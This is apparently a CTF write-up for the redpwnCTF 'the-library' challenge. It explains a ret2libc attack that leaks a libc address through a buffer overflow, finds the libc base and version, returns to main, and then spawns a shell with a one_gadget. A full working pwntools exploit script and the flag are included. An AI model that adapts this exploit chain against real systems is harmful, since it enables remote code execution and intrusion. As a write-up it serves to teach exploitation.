# the-library
This is a classic `ret2libc` exploit, where we want the main fuctino to return to the libc file where we can access many usefull functions.
## ret2libc procedure
To run a return to libc exploit, we need some fundemental elements.
* libc position
* libc version
* function offsets
* return to main
* etc.
First, we need to tackle the libc position. We need to find this on the remote server since it will be different on every machine. Also, the position will change each time we run the program due to `ASLR`, so we need to do the exploit in one run.
### libc position
```cpp
read(0, name, 0x100);
puts("Hello there: ");
puts(name);
```
In the program, after the input we we can see that we have 2 `puts()` we could leverage using `BOF`. What we need to do is to first overflow to the `rip` registers then run `pop_rdi` gadget then put the `global offset table` value of puts into `puts` itself and we leaked the address of puts. With that and the original libc, we can locate the base pointer of `libc`.  
To find the symboles and GOT addresses, pwntools got us covered. The only thing we need to get is `pop_rdi`. We could use `ropper` to search for it.
```bash
ropper -- file the-library --search "% ?di"

0x0000000000400733: pop rdi; ret;
```
We got the address of the gadget and now we can try an write a script to leak the libc location.
#### script
```python
from pwn import *
host,port="2020.redpwnc.tf",31350
p = connect(host,port)
binary = ELF('./the-library')
libc = ELF('./libc.so.6')
JUNK = "A" * 24
main = binary.symbols['main']
got_puts = binary.got['puts']
plt_puts = binary.plt['puts']
pop_rdi = 0x400733

payload = JUNK
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
libc_puts = libc.symbols['puts']
libc.address = leaked_puts - libc_puts
log.success("Leaked puts :  {}".format(hex(leaked_puts)))
log.success("Libc at  :  {}".format(hex(libc.address)))
```
By subtracting the leaked puts address and the libc puts location, we get the libc base pointer.

### Finding the version and offsets
We could use libcdb to find the version of libc running with some address of a function. The site also has the offsets for functinos we need.
```
libc6_2.27-3ubuntu1_amd64
libc6_2.3.6-0ubuntu20_i386_2
```
These are the versions that satisfy our leaked address, and obviously, we are running on a 64 bit architecture so `amd64` is the way to go.
### Call Main
We don't want the program to terminate at this point as all our effort into finding the libc will be lost as it will change next run. So, how do we execute the code again? Well, we could call `main`
### Getting a Shell
We could obviously find the `system()` function and the `/bin/sh` gadget using pwntools, but when I was researching I found something called [`one_gadget`](https://github.com/david942j/one_gadget). This is basically one single gadget that will pop a shell for you. And when I checked, it was compatible with our platform.

## Final Exploit
Now we just need to leak the libc, run main, run onegadget and we got a shell. Here's the full script.
```python
from pwn import *
host,port="2020.redpwnc.tf",31350
p = connect(host,port)
binary = ELF('./the-library')
libc = ELF('./libc.so.6')
JUNK = "A" * 24
main = binary.symbols['main']
got_puts = binary.got['puts']
plt_puts = binary.plt['puts']
pop_rdi = 0x400733


payload = JUNK
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
libc_puts = libc.symbols['puts']
libc.address = leaked_puts - libc_puts
log.success("Leaked puts :  {}".format(hex(leaked_puts)))
log.success("Libc at  :  {}".format(hex(libc.address)))


libc_base=libc.address
payload = JUNK
one_gadget = p64(libc.address + 0x4f2c5) 
payload+=one_gadget

p.recvline()
p.sendline(payload)
p.interactive()
```
## Flag
Cat out `flag.txt`
```bash
cat flag.txt
flag{jump_1nt0_th3_l1brary}
```